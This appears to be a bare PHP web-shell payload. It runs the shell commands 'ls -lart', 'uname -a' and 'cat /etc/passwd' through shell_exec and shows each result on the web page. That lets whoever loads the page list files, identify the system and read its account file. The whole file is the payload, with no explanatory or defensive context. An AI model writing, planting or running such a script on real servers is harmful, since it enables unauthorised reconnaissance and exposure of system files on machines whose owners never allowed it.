<?php
$output = shell_exec('ls -lart');
echo "<pre>$output</pre>";

$output = shell_exec('uname -a');
echo "<pre>$output</pre>";

$output = shell_exec('cat /etc/passwd');
echo "<pre>$output</pre>";


?>
